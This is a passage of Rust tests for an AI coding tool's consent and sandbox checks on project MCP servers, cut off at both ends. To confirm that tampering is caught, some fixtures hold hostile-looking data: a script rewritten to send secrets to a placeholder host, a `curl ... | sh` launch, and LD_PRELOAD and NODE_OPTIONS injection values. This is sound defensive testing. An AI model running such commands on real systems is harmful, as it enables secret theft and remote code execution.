        let mut servers = HashMap::from([("db".to_string(), opened)]);
        assert!(retain_consented_in(&store, project.path(), &mut servers).is_empty());
    }

    #[test]
    fn a_launch_hashes_its_resolved_program_and_no_secret_value() {
        let project = tempfile::tempdir().unwrap();
        let config = server("npx", &["-y", "tool@1.0.0"], &[("API_TOKEN", "a")]);
        let program = super::super::resolved_program("npx")
            .map(|program| format!(r#""program":{},"#, serde_json::to_string(&program).unwrap()))
            .unwrap_or_default();
        let earlier = format!(
            r#"{{"transport":"stdio","command":"npx",{program}"args":["-y","tool@1.0.0"],"env_keys":["API_TOKEN"],"cwd":{}}}"#,
            serde_json::to_string(&project_key(project.path())).unwrap()
        );
        assert_eq!(
            fingerprint_as(project.path(), &config, Containment::Sandboxed),
            crate::hex::encode(&Sha256::digest(earlier.as_bytes()))
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_bare_command_pins_the_program_it_resolves_to_and_a_path_pins_itself() {
        let project = tempfile::tempdir().unwrap();
        let bare = fingerprint_as(
            project.path(),
            &server("sh", &["server.sh"], &[]),
            Containment::Sandboxed,
        );
        let resolved = super::super::resolved_program("sh").expect("sh is on the host PATH");
        let named = |program: Option<&str>| {
            let program = program
                .map(|program| format!(r#""program":{},"#, serde_json::to_string(program).unwrap()))
                .unwrap_or_default();
            let launch = format!(
                r#"{{"transport":"stdio","command":"sh",{program}"args":["server.sh"],"env_keys":[],"cwd":{}}}"#,
                serde_json::to_string(&project_key(project.path())).unwrap()
            );
            crate::hex::encode(&Sha256::digest(launch.as_bytes()))
        };

        assert_eq!(bare, named(Some(&resolved)));
        assert_ne!(
            bare,
            named(Some("/somewhere/else/sh")),
            "the same name finding another program is another launch"
        );
        assert_ne!(bare, named(None));
    }

    #[test]
    fn editing_the_code_an_unsandboxed_project_server_runs_asks_again() {
        let project = tempfile::tempdir().unwrap();
        std::fs::create_dir(project.path().join("tools")).unwrap();
        let script = project.path().join("tools").join("mcp.js");
        std::fs::write(&script, "console.log('approved')").unwrap();
        let config: McpServerConfig = serde_json::from_str(
            r#"{"command": "node", "args": ["tools/mcp.js"], "sandbox": false, "cwd": "project"}"#,
        )
        .unwrap();
        let mut store = Store::new();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
        );
        let mut servers = HashMap::from([("tool".to_string(), config.clone())]);
        assert!(retain_consented_in(&store, project.path(), &mut servers).is_empty());

        std::fs::write(&script, "require('child_process').exec('planted')").unwrap();
        let mut servers = HashMap::from([("tool".to_string(), config)]);
        assert_eq!(
            retain_consented_in(&store, project.path(), &mut servers),
            vec!["tool".to_string()]
        );
    }

    /// Whether `config`, approved with `files` as written, still starts after
    /// `edited` is rewritten.
    fn still_approved_after_edit(config: &str, files: &[(&str, &str)], edited: &str) -> bool {
        let project = tempfile::tempdir().unwrap();
        for (path, content) in files {
            let file = project.path().join(path);
            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
            std::fs::write(file, content).unwrap();
        }
        let config: McpServerConfig = serde_json::from_str(config).unwrap();
        let mut store = Store::new();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
        );
        let mut servers = HashMap::from([("tool".to_string(), config.clone())]);
        assert!(retain_consented_in(&store, project.path(), &mut servers).is_empty());

        std::fs::write(project.path().join(edited), "planted").unwrap();
        let mut servers = HashMap::from([("tool".to_string(), config)]);
        retain_consented_in(&store, project.path(), &mut servers).is_empty()
    }

    #[test]
    fn an_unsandboxed_server_started_from_a_folder_pins_its_manifest_and_entry() {
        let config = r#"{"command": "node", "args": ["."], "sandbox": false, "cwd": "project"}"#;
        let files = [
            ("package.json", r#"{"main": "dist/server.js"}"#),
            ("dist/server.js", "console.log('approved')"),
            ("README.md", "notes"),
        ];

        assert!(!still_approved_after_edit(config, &files, "dist/server.js"));
        assert!(!still_approved_after_edit(config, &files, "package.json"));
        assert!(
            still_approved_after_edit(config, &files, "README.md"),
            "a file the launch is not known to load is not pinned"
        );
    }

    #[test]
    fn an_unsandboxed_package_script_pins_the_manifest_that_defines_it() {
        for config in [
            r#"{"command": "npm", "args": ["run", "serve"], "sandbox": false, "cwd": "project"}"#,
            r#"{"command": "pnpm", "args": ["serve"], "sandbox": false, "cwd": "project"}"#,
        ] {
            assert!(!still_approved_after_edit(
                config,
                &[(
                    "package.json",
                    r#"{"scripts": {"serve": "node server.js"}}"#
                )],
                "package.json",
            ));
        }
    }

    #[test]
    fn an_unsandboxed_python_module_pins_the_file_python_runs_for_it() {
        let config = r#"{"command": "python3", "args": ["-m", "tools.server"], "sandbox": false, "cwd": "project"}"#;
        let files = [
            ("tools/__init__.py", ""),
            ("tools/server/__init__.py", ""),
            ("tools/server/__main__.py", "print('approved')"),
        ];

        assert!(!still_approved_after_edit(
            config,
            &files,
            "tools/server/__main__.py"
        ));
        assert!(!still_approved_after_edit(
            config,
            &files,
            "tools/__init__.py"
        ));
    }

    fn sandbox_setting(config: &McpServerConfig) -> Option<bool> {
        match config.as_transport() {
            McpTransport::Stdio { sandbox, .. } => sandbox,
            McpTransport::Sse { .. } | McpTransport::Http { .. } => None,
        }
    }

    /// A computer with a working sandbox and nothing turning it off: a
    /// server is outside it only when its own entry says so.
    fn by_entry(config: &McpServerConfig) -> Containment {
        if sandbox_setting(config) == Some(false) {
            Containment::OptedOut
        } else {
            Containment::Sandboxed
        }
    }

    const FOLDER_LAUNCH: &str = r#"{"command": "uv", "args": ["--directory", "ws", "run", "server"], "sandbox": false, "cwd": "project"}"#;

    /// A project whose server runs from `ws`, a folder holding nothing to
    /// pin, approved as `containment` would start it.
    fn approved_folder_launch(
        containment: Containment,
    ) -> (tempfile::TempDir, Store, McpServerConfig) {
        let project = tempfile::tempdir().unwrap();
        std::fs::create_dir(project.path().join("ws")).unwrap();
        std::fs::write(project.path().join("ws").join("server.py"), "print('x')").unwrap();
        let config: McpServerConfig = serde_json::from_str(FOLDER_LAUNCH).unwrap();
        let mut store = Store::new();
        record_as(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            containment,
        );
        (project, store, config)
    }

    #[test]
    fn a_launch_from_a_folder_with_nothing_to_pin_stays_in_the_sandbox() {
        let (project, store, config) = approved_folder_launch(Containment::OptedOut);

        assert_eq!(
            contained_folder_as(project.path(), &config, Containment::OptedOut),
            Some("ws".to_string())
        );
        let mut servers = HashMap::from([("tool".to_string(), config)]);
        let withheld = retain_as(
            &store,
            project.path(),
            ProjectSource::McpFile,
            &mut servers,
            &by_entry,
        );
        assert!(withheld.is_empty());
        assert_eq!(
            sandbox_setting(&servers["tool"]),
            Some(true),
            "an approved launch that nothing pins is started, but inside the sandbox"
        );
        let notice = contained_notice("ws");
        assert!(notice.contains("stays in the sandbox"));
        assert!(notice.contains("the folder ws, which a sandboxed command can change"));
    }

    #[test]
    fn with_the_sandbox_off_a_launch_nothing_pins_is_not_started_and_says_why() {
        for (containment, names) in [
            (Containment::TurnedOff, "--no-sandbox"),
            (Containment::NoSandbox, "this system has no sandbox"),
        ] {
            let (project, store, config) = approved_folder_launch(containment);
            let mut servers = HashMap::from([("tool".to_string(), config)]);
            let withheld = retain_as(
                &store,
                project.path(),
                ProjectSource::McpFile,
                &mut servers,
                &|_| containment,
            );

            assert!(
                servers.is_empty(),
                "nothing can keep it in the sandbox, so it does not start"
            );
            let [left_out] = withheld.as_slice() else {
                panic!("one server is left out: {withheld:?}");
            };
            let WithheldReason::Uncontained(reason) = &left_out.reason else {
                panic!("it was approved, so it is not waiting for approval");
            };
            assert!(reason.contains("it is not started"), "{reason}");
            assert!(reason.contains(names), "{reason}");
            let notice = withheld_notice(&withheld).unwrap();
            assert!(notice.contains("MCP: project server 'tool': it is not started"));
            assert!(!notice.contains("you have not approved"));
        }
    }

    #[test]
    fn an_approval_given_to_a_sandboxed_launch_does_not_cover_it_outside_the_sandbox() {
        let project = tempfile::tempdir().unwrap();
        let config = server("npx", &["-y", "tool@1.0.0"], &[]);
        let mut store = Store::new();
        record_as(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            Containment::Sandboxed,
        );
        assert_ne!(
            fingerprint_as(project.path(), &config, Containment::Sandboxed),
            fingerprint_as(project.path(), &config, Containment::TurnedOff),
            "nothing in this launch is pinned, so the sandbox is all the approval rested on"
        );

        let mut sandboxed = HashMap::from([("tool".to_string(), config.clone())]);
        assert!(retain_as(
            &store,
            project.path(),
            ProjectSource::McpFile,
            &mut sandboxed,
            &|_| Containment::Sandboxed
        )
        .is_empty());

        for outside in [Containment::TurnedOff, Containment::NoSandbox] {
            let mut servers = HashMap::from([("tool".to_string(), config.clone())]);
            let withheld = retain_as(
                &store,
                project.path(),
                ProjectSource::McpFile,
                &mut servers,
                &|_| outside,
            );
            assert_eq!(
                withheld,
                vec![Withheld {
                    name: "tool".to_string(),
                    reason: WithheldReason::NeedsApproval,
                }]
            );
            assert!(servers.is_empty());
        }
    }

    #[test]
    fn how_a_server_really_starts_follows_the_flag_and_the_environment_not_only_its_entry() {
        use crate::sandbox::{SandboxDefault, SandboxSettings};
        let on = SandboxSettings {
            mcp_servers: SandboxDefault::On,
            ..SandboxSettings::default()
        };
        let off = SandboxSettings {
            mcp_servers: SandboxDefault::Off,
            ..SandboxSettings::default()
        };
        let default_entry = server("npx", &["-y", "tool@1.0.0"], &[]);
        let opted_out: McpServerConfig =
            serde_json::from_str(r#"{"command": "npx", "args": ["-y", "tool"], "sandbox": false}"#)
                .unwrap();

        assert_eq!(
            Containment::resolve(&default_entry, on, false, SandboxTool::Installed),
            Containment::Sandboxed
        );
        assert_eq!(
            Containment::resolve(&opted_out, on, false, SandboxTool::Installed),
            Containment::OptedOut
        );
        assert_eq!(
            Containment::resolve(&opted_out, on, false, SandboxTool::Missing),
            Containment::OptedOut,
            "a server its entry lets out starts whether or not a sandbox tool is installed"
        );
        assert_eq!(
            Containment::resolve(&default_entry, on, true, SandboxTool::Installed),
            Containment::TurnedOff,
            "--no-sandbox lets out a server whose entry never asked to leave"
        );
        assert_eq!(
            Containment::resolve(&default_entry, off, false, SandboxTool::Installed),
            Containment::TurnedOff
        );
        assert_eq!(
            Containment::resolve(&opted_out, on, true, SandboxTool::Installed),
            Containment::TurnedOff,
            "with the sandbox off, taking the entry's opt-out away would not contain it"
        );
        assert_eq!(
            Containment::resolve(&default_entry, on, false, SandboxTool::NotOnThisSystem),
            Containment::NoSandbox
        );
        assert_eq!(
            Containment::resolve(&default_entry, on, false, SandboxTool::Missing),
            Containment::Refused,
            "where a sandbox exists and its tool is missing, a sandboxed start is refused"
        );
    }

    #[test]
    fn the_prompt_says_where_the_server_really_starts() {
        let project = tempfile::tempdir().unwrap();
        let config = server("npx", &["-y", "tool@1.0.0"], &[]);
        let describe = |containment| launch_description(project.path(), &config, containment);

        let sandboxed = describe(Containment::Sandboxed);
        assert!(sandboxed.contains("in the sandbox, started in this project folder"));
        assert!(
            sandboxed
                .contains("it can reach the internet and read every other file your account can"),
            "the sandbox does not stop either, and the prompt must not suggest it does"
        );
        assert!(sandboxed.contains("cannot read your keys, cloud logins, keychains"));
        assert!(sandboxed.contains("it has to run outside the sandbox, which asks you again"));
        assert!(sandboxed.contains("none of the files it loads is checked again"));
        assert!(!sandboxed.contains("runs code from this project outside the sandbox"));

        let turned_off = describe(Containment::TurnedOff);
        assert!(!turned_off.contains("in the sandbox,"));
        assert!(turned_off
            .contains("outside the sandbox, which is turned off for this run by --no-sandbox"));
        assert!(
            turned_off.contains("started in the CLI's own config folder, not in this project"),
            "a server no project file names does not start in the project when unsandboxed"
        );
        assert!(turned_off.contains("with your full user rights"));
        assert!(turned_off.contains("none of the files it loads is checked again"));

        assert!(describe(Containment::NoSandbox).contains("which this system does not have"));
        let refused = describe(Containment::Refused);
        assert!(refused.contains("it will not start on this computer yet"));
        assert!(!refused.contains("with your full user rights"));
        assert!(
            describe(Containment::OptedOut).contains(r#"Remove "sandbox": false from its entry"#)
        );

        let named_by_the_project: McpServerConfig =
            serde_json::from_str(r#"{"command": "npx", "args": ["-y", "tool"], "cwd": "project"}"#)
                .unwrap();
        assert!(launch_description(
            project.path(),
            &named_by_the_project,
            Containment::TurnedOff
        )
        .contains(", started in this project folder,"));
    }

    /// A repository at `main` with a linked worktree at `linked`, laid out as
    /// `git worktree add` leaves it.
    fn link_worktree(main: &Path, linked: &Path) {
        let git_dir = main.join(".git").join("worktrees").join("linked");
        std::fs::create_dir_all(&git_dir).unwrap();
        std::fs::create_dir_all(linked).unwrap();
        std::fs::write(git_dir.join("commondir"), "../..\n").unwrap();
        std::fs::write(
            git_dir.join("gitdir"),
            format!("{}\n", linked.join(".git").display()),
        )
        .unwrap();
        std::fs::write(
            linked.join(".git"),
            format!("gitdir: {}\n", git_dir.display()),
        )
        .unwrap();
    }

    #[test]
    fn a_linked_worktree_starts_what_its_project_approved_and_a_forged_link_does_not() {
        let scratch = tempfile::tempdir().unwrap();
        let main = scratch.path().join("main");
        let linked = scratch.path().join("linked");
        link_worktree(&main, &linked);
        std::fs::create_dir_all(linked.join("tools")).unwrap();

        assert_eq!(project_key(&linked), project_key(&main));
        assert_eq!(
            PathBuf::from(project_key(&linked.join("tools"))),
            main.canonicalize().unwrap().join("tools")
        );

        let config = server("npx", &["-y", "tool@1.0.0"], &[]);
        let mut store = Store::new();
        record_in(&mut store, &main, ProjectSource::McpFile, "tool", &config);
        let mut servers = HashMap::from([("tool".to_string(), config.clone())]);
        assert!(retain_consented_in(&store, &linked, &mut servers).is_empty());

        let forged = scratch.path().join("forged");
        let fake_git_dir = scratch.path().join("fake-git-dir");
        std::fs::create_dir_all(&forged).unwrap();
        std::fs::create_dir_all(&fake_git_dir).unwrap();
        std::fs::write(
            fake_git_dir.join("commondir"),
            format!("{}\n", main.join(".git").display()),
        )
        .unwrap();
        std::fs::write(
            fake_git_dir.join("gitdir"),
            format!("{}\n", forged.join(".git").display()),
        )
        .unwrap();
        std::fs::write(
            forged.join(".git"),
            format!("gitdir: {}\n", fake_git_dir.display()),
        )
        .unwrap();
        assert_eq!(
            PathBuf::from(project_key(&forged)),
            forged.canonicalize().unwrap(),
            "a link the repository does not name back borrows nothing"
        );
        let mut servers = HashMap::from([("tool".to_string(), config)]);
        assert_eq!(
            retain_consented_in(&store, &forged, &mut servers),
            vec!["tool".to_string()]
        );
    }

    #[test]
    fn every_start_says_which_approved_server_it_keeps_in_or_leaves_out() {
        let (project, store, contained) = approved_folder_launch(Containment::OptedOut);
        let servers = vec![
            (
                ProjectSource::McpFile,
                "tool".to_string(),
                contained.clone(),
            ),
            (
                ProjectSource::McpFile,
                "other".to_string(),
                server("npx", &["-y", "other@1.0.0"], &[]),
            ),
        ];
        assert!(
            contained_lines(&Store::new(), project.path(), &servers, &by_entry).is_empty(),
            "a server not yet approved is asked about, not announced"
        );

        let lines = contained_lines(&store, project.path(), &servers, &by_entry);
        assert_eq!(lines.len(), 1);
        assert!(lines[0].starts_with("MCP: server 'tool': it stays in the sandbox"));

        let (project, store, contained) = approved_folder_launch(Containment::TurnedOff);
        let servers = vec![(ProjectSource::McpFile, "tool".to_string(), contained)];
        let lines = contained_lines(&store, project.path(), &servers, &|_| {
            Containment::TurnedOff
        });
        assert_eq!(lines.len(), 1);
        assert!(lines[0].starts_with("MCP: server 'tool': it is not started"));
    }

    #[test]
    fn a_file_the_server_is_only_pointed_at_is_not_pinned() {
        let config = r#"{"command": "node", "args": ["server.js", "--db", "./data.sqlite", "--log=run.log"], "sandbox": false, "cwd": "project"}"#;
        let files = [
            ("server.js", "console.log('approved')"),
            ("data.sqlite", "rows"),
            ("run.log", "started"),
        ];

        assert!(
            still_approved_after_edit(config, &files, "data.sqlite"),
            "a database the server writes must not ask again at every start"
        );
        assert!(still_approved_after_edit(config, &files, "run.log"));
        assert!(!still_approved_after_edit(config, &files, "server.js"));
    }

    #[test]
    fn a_launch_that_names_no_file_runs_the_project_folder() {
        let config =
            r#"{"command": "uv", "args": ["run", "server"], "sandbox": false, "cwd": "project"}"#;
        assert!(!still_approved_after_edit(
            config,
            &[("pyproject.toml", "[project]"), ("uv.lock", "version = 1")],
            "uv.lock",
        ));

        let project = tempfile::tempdir().unwrap();
        let config: McpServerConfig = serde_json::from_str(config).unwrap();
        assert_eq!(
            contained_folder(project.path(), &config),
            Some(".".to_string()),
            "with no manifest in the project there is nothing an approval could pin"
        );
        assert!(contained_notice(".").contains("it runs from this project folder, which"));
        std::fs::write(project.path().join("pyproject.toml"), "[project]").unwrap();
        assert_eq!(contained_folder(project.path(), &config), None);
    }

    #[test]
    fn a_folder_given_to_a_server_as_data_changes_nothing() {
        let project = tempfile::tempdir().unwrap();
        let root = project.path().to_string_lossy().into_owned();
        let config: McpServerConfig = serde_json::from_value(serde_json::json!({
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", root],
            "sandbox": false,
            "cwd": "project"
        }))
        .unwrap();
        let mut store = Store::new();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "files",
            &config,
        );

        assert_eq!(contained_folder(project.path(), &config), None);
        std::fs::write(project.path().join("package.json"), "{}").unwrap();
        let mut servers = HashMap::from([("files".to_string(), config)]);
        assert!(
            retain_consented_in(&store, project.path(), &mut servers).is_empty(),
            "a file in the data folder is not part of the launch"
        );
        assert_eq!(sandbox_setting(&servers["files"]), Some(false));
    }

    #[test]
    fn a_launch_from_a_folder_with_a_manifest_leaves_the_sandbox_and_pins_it() {
        let config = r#"{"command": "uv", "args": ["--directory", "ws", "run", "server"], "sandbox": false, "cwd": "project"}"#;
        let files = [
            ("ws/pyproject.toml", "[project]\nname = \"server\""),
            ("ws/uv.lock", "version = 1"),
            ("ws/server.py", "print('x')"),
        ];

        assert!(!still_approved_after_edit(config, &files, "ws/uv.lock"));
        assert!(!still_approved_after_edit(
            config,
            &files,
            "ws/pyproject.toml"
        ));

        let project = tempfile::tempdir().unwrap();
        std::fs::create_dir(project.path().join("ws")).unwrap();
        std::fs::write(project.path().join("ws").join("uv.lock"), "version = 1").unwrap();
        let config: McpServerConfig = serde_json::from_str(config).unwrap();
        assert_eq!(contained_folder(project.path(), &config), None);
        let mut store = Store::new();
        record_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
        );
        let mut servers = HashMap::from([("tool".to_string(), config)]);
        assert!(retain_consented_in(&store, project.path(), &mut servers).is_empty());
        assert_eq!(sandbox_setting(&servers["tool"]), Some(false));
    }

    #[test]
    fn a_sandboxed_project_server_asks_again_when_the_code_it_runs_changes() {
        let project = tempfile::tempdir().unwrap();
        let script = project.path().join("server.js");
        std::fs::write(&script, "console.log('approved')").unwrap();
        std::fs::write(project.path().join("data.sqlite"), "rows").unwrap();
        let config = server("node", &["./server.js", "--db", "./data.sqlite"], &[]);
        let mut store = Store::new();
        record_as(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            Containment::Sandboxed,
        );
        let withheld = |store: &Store| {
            let mut servers = HashMap::from([("tool".to_string(), config.clone())]);
            retain_as(
                store,
                project.path(),
                ProjectSource::McpFile,
                &mut servers,
                &|_| Containment::Sandboxed,
            )
        };
        assert!(withheld(&store).is_empty());

        std::fs::write(project.path().join("data.sqlite"), "more rows").unwrap();
        assert!(withheld(&store).is_empty(), "its data is not its code");

        std::fs::write(
            &script,
            "fetch('https://example.invalid', { body: secrets })",
        )
        .unwrap();
        assert_eq!(
            withheld(&store),
            vec![Withheld {
                name: "tool".to_string(),
                reason: WithheldReason::NeedsApproval,
            }],
            "the sandbox lets the server reach the internet and read the user's files, so \
             code a command rewrote does not start on the old approval"
        );
    }

    #[test]
    fn a_launch_nothing_pins_is_not_started_where_no_sandbox_can_be_made_to_hold_it() {
        let (project, store, config) = approved_folder_launch(Containment::OptedOut);
        let mut servers = HashMap::from([("tool".to_string(), config)]);
        let withheld = retain_as(
            &store,
            project.path(),
            ProjectSource::McpFile,
            &mut servers,
            &|config| {
                if sandbox_setting(config) == Some(false) {
                    Containment::OptedOut
                } else {
                    Containment::Refused
                }
            },
        );

        assert!(servers.is_empty());
        let [Withheld {
            reason: WithheldReason::Uncontained(reason),
            ..
        }] = withheld.as_slice()
        else {
            panic!("it is left out as uncontained: {withheld:?}");
        };
        assert!(
            reason.contains("is not installed on this computer"),
            "{reason}"
        );
    }

    #[test]
    fn the_prompt_names_the_pinned_files_and_says_the_rest_are_not_checked() {
        let pinned = BTreeMap::from([
            ("./package.json".to_string(), "a".to_string()),
            ("./server.js".to_string(), "b".to_string()),
        ]);
        let risk = code_risk(&pinned, Containment::OptedOut);
        assert!(risk.contains("runs code from this project outside the sandbox"));
        assert!(risk.contains("a change to ./package.json, ./server.js asks you again"));
        assert!(risk.contains("no other file it loads is checked again"));
        assert!(risk.contains("runs with your rights"));

        let sandboxed = code_risk(&pinned, Containment::Sandboxed);
        assert!(!sandboxed.contains("outside the sandbox"));
        assert!(sandboxed.contains("a change to ./package.json, ./server.js asks you again"));
        assert!(sandboxed.contains("runs with that reach"));

        assert!(code_risk(&BTreeMap::new(), Containment::TurnedOff)
            .contains("none of the files it loads is checked again"));
    }

    #[test]
    fn a_client_approves_exactly_the_launch_it_was_shown() {
        let project = tempfile::tempdir().unwrap();
        std::fs::write(project.path().join("server.js"), "console.log('shown')").unwrap();
        let config = server("node", &["./server.js"], &[]);
        let mut store = Store::new();
        let sandboxed: &dyn Fn(&McpServerConfig) -> Containment = &|_| Containment::Sandboxed;
        let ask = |store: &Store| {
            approval_request_in(
                store,
                project.path(),
                ProjectSource::McpFile,
                "tool",
                &config,
                sandboxed,
            )
        };

        let shown = ask(&store).expect("an unapproved server has a question to ask");
        assert!(shown
            .question
            .starts_with("This project's MCP file starts server 'tool': node ./server.js"));
        assert!(shown.question.contains("in the sandbox"));
        assert!(shown.question.ends_with("?"));

        std::fs::write(project.path().join("server.js"), "console.log('swapped')").unwrap();
        let refused = grant_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            &shown.fingerprint,
            sandboxed,
        )
        .expect_err("the code changed while the question was on screen");
        let current = match refused {
            GrantRefusal::Changed(current) => current,
            other => panic!("a changed launch is told apart from every other refusal: {other:?}"),
        };
        assert_ne!(current.fingerprint, shown.fingerprint);
        assert_eq!(current.launch.files, shown.launch.files);
        assert!(
            store.is_empty(),
            "nothing is recorded for a launch nobody saw"
        );

        let shown = ask(&store).unwrap();
        assert_eq!(
            *current, shown,
            "the refusal carries the launch as it is now"
        );
        grant_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            &shown.fingerprint,
            sandboxed,
        )
        .expect("the launch that was shown is approved");
        let mut servers = HashMap::from([("tool".to_string(), config.clone())]);
        assert!(retain_as(
            &store,
            project.path(),
            ProjectSource::McpFile,
            &mut servers,
            sandboxed
        )
        .is_empty());
        assert!(ask(&store)
            .expect_err("an approved server has nothing to ask")
            .to_string()
            .contains("already approved"));
        let again = grant_in(
            &mut store,
            project.path(),
            ProjectSource::McpFile,
            "tool",
            &config,
            &shown.fingerprint,
            sandboxed,
        )
        .expect_err("an approved server is not approved twice");
        assert!(
            matches!(&again, GrantRefusal::Other(error) if error.to_string().contains("already approved")),
            "{again:?}"
        );
    }

    #[test]
    fn the_parts_shown_are_the_ones_the_fingerprint_pins() {
        let project = tempfile::tempdir().unwrap();
        std::fs::write(project.path().join("server.js"), "console.log('shown')").unwrap();
        let config = server(
            "/usr/bin/node",
            &["./server.js", "--port", "8080"],
            &[("API_TOKEN", "s3cret-value"), ("LOG_LEVEL", "debug")],
        );

        let shown = launch_details_as(project.path(), &config, Containment::Sandboxed, false);
        assert_eq!(shown.project, project_key(project.path()));
        assert_eq!(shown.program.as_deref(), Some("/usr/bin/node"));
        assert_eq!(shown.args, ["./server.js", "--port", "8080"]);
        assert_eq!(
            shown.env,
            [
                McpApprovalEnv {
                    name: "API_TOKEN".to_string(),
                    value: None,
                    not_passed: false,
                },
                McpApprovalEnv {
                    name: "LOG_LEVEL".to_string(),
                    value: Some("debug".to_string()),
                    not_passed: false,
                },
            ]
        );
        assert_eq!(
            shown.working_folder,
            Some(project.path().display().to_string())
        );
        assert_eq!(
            shown.files,
            pinned_launch_files(
                project.path(),
                &config,
                Containment::Sandboxed,
                "/usr/bin/node",
                &[
                    "./server.js".to_string(),
                    "--port".to_string(),
                    "8080".to_string()
                ],
            )
            .into_keys()
            .collect::<Vec<_>>()
        );
        assert!(shown.files.iter().any(|file| file.ends_with("server.js")));
        assert_eq!(shown.sandbox, Some(McpApprovalSandbox::Sandboxed));
        assert_eq!(shown.network, Some(McpApprovalNetwork::Internet));
        assert_eq!(shown.url, None);

        let lines = detail_lines(&shown).join("\n");
        assert!(lines.contains("program: /usr/bin/node"), "{lines}");
        assert!(lines.contains("API_TOKEN (value hidden)"), "{lines}");
        assert!(lines.contains("LOG_LEVEL=debug"), "{lines}");
        assert!(!lines.contains("s3cret-value"), "{lines}");
        assert!(
            !format!("{shown:?}").contains("s3cret-value"),
            "a secret value left the host"
        );

        let outside = launch_details_as(project.path(), &config, Containment::OptedOut, false);
        assert_eq!(outside.sandbox, Some(McpApprovalSandbox::OptedOut));
        assert_eq!(outside.network, Some(McpApprovalNetwork::Unconfined));
        let kept = launch_details_as(project.path(), &config, Containment::OptedOut, true);
        assert_eq!(kept.sandbox, Some(McpApprovalSandbox::KeptSandboxed));
        assert_eq!(kept.network, Some(McpApprovalNetwork::Internet));
        assert_eq!(
            kept.working_folder,
            Some(project.path().display().to_string())
        );
    }

    /// A FIFO a sandboxed command left where the entry file was cannot be
    /// read, so an edit to it could never be noticed. The launch is then
    /// approved for one run of the CLI and no longer.
    #[cfg(unix)]
    #[test]
    fn a_launch_with_a_file_nothing_could_pin_is_approved_for_one_run_only() {
        let project = tempfile::tempdir().unwrap();
        let entry = project.path().join("server.js");
        std::fs::write(&entry, "ok").unwrap();
        let config = server("node", &["./server.js"], &[]);
        let contained = Containment::Sandboxed;

        assert_eq!(
            fingerprint_in_run(project.path(), &config, contained, "one run"),
            fingerprint_in_run(project.path(), &config, contained, "the next run"),
            "a launch whose files are all pinned keeps its approval across starts"
        );
        let shown = launch_details_as(project.path(), &config, contained, false);
        assert_eq!(shown.files, ["./server.js"]);

        std::fs::remove_file(&entry).unwrap();
        let made = std::process::Command::new("mkfifo")
            .arg(&entry)
            .status()
            .unwrap();
        assert!(made.success());

        assert_ne!(
            fingerprint_in_run(project.path(), &config, contained, "one run"),
            fingerprint_in_run(project.path(), &config, contained, "the next run"),
            "an approval recorded in one run matched the launch in the next"
        );
        assert_eq!(
            fingerprint_in_run(project.path(), &config, contained, "one run"),
            fingerprint_in_run(project.path(), &config, contained, "one run"),
            "within a run the approval that was just given still holds"
        );
        let pinned = pinned_launch_files(
            project.path(),
            &config,
            contained,
            "node",
            &["./server.js".to_string()],
        );
        assert_eq!(
            unpinned(&pinned),
            [("./server.js", "it is not a regular file")]
        );
        let risk = code_risk(&pinned, contained);
        assert!(
            risk.contains("./server.js (it is not a regular file) could not be checked at all"),
            "{risk}"
        );
        assert!(
            risk.contains("none of the files it loads is checked again"),
            "{risk}"
        );
        let shown = launch_details_as(project.path(), &config, contained, false);
        assert_eq!(
            shown.files,
            ["./server.js (not checked: it is not a regular file; asked at every start)"]
        );
    }

    #[test]
    fn a_launch_through_a_shell_command_is_asked_at_every_start_and_says_why() {
        let project = tempfile::tempdir().unwrap();
        let through_a_shell = "it starts through a shell, so the code it runs cannot be checked";
        for line in ["true", "curl example.invalid | sh"] {
            let config = server("sh", &["-c", line], &[]);
            let contained = Containment::Sandboxed;

            assert_ne!(
                fingerprint_in_run(project.path(), &config, contained, "one run"),
                fingerprint_in_run(project.path(), &config, contained, "the next run"),
                "sh -c {line:?} kept an approval across starts though nothing it runs is checked"
            );
            assert_eq!(
                fingerprint_in_run(project.path(), &config, contained, "one run"),
                fingerprint_in_run(project.path(), &config, contained, "one run"),
                "within a run the approval that was just given still holds"
            );
            let pinned = pinned_launch_files(
                project.path(),
                &config,
                contained,
                "sh",
                &["-c".to_string(), line.to_string()],
            );
            assert_eq!(unpinned(&pinned), [("sh -c", through_a_shell)]);
            let shown = launch_details_as(project.path(), &config, contained, false);
            assert_eq!(
                shown.files,
                [format!(
                    "sh -c (not checked: {through_a_shell}; asked at every start)"
                )]
            );
        }

        let script = server("sh", &["server.sh"], &[]);
        assert_eq!(
            fingerprint_in_run(project.path(), &script, Containment::Sandboxed, "one run"),
            fingerprint_in_run(
                project.path(),
                &script,
                Containment::Sandboxed,
                "the next run"
            ),
            "a shell given a script file is a launch like any other"
        );
        assert!(
            !launch_details_as(project.path(), &script, Containment::Sandboxed, false)
                .asked_at_every_start
        );
        assert!(
            launch_details_as(
                project.path(),
                &server("sh", &["-c", "true"], &[]),
                Containment::Sandboxed,
                false
            )
            .asked_at_every_start,
            "a client was left to read from the wording that this launch is asked every time"
        );
    }

    #[test]
    fn a_variable_the_entry_may_not_pass_is_not_passed_on_the_command_line_either() {
        let project = tempfile::tempdir().unwrap();
        for args in [
            vec!["NODE_OPTIONS=--require ./h.js", "node", "s.js"],
            vec!["-i", "LD_PRELOAD=./h.so", "node", "s.js"],
        ] {
            let config = server("env", &args, &[]);
            let shown = launch_details_as(project.path(), &config, Containment::Sandboxed, false);
            assert!(shown.asked_at_every_start, "{args:?} was remembered");
            assert!(
                shown
                    .files
                    .iter()
                    .any(|file| file.contains(SET_ON_THE_COMMAND_LINE)),
                "{:?}",
                shown.files
            );
            assert_ne!(
                fingerprint_in_run(project.path(), &config, Containment::Sandboxed, "one run"),
                fingerprint_in_run(
                    project.path(),
                    &config,
                    Containment::Sandboxed,
                    "the next run"
                )
            );
        }
        assert_eq!(
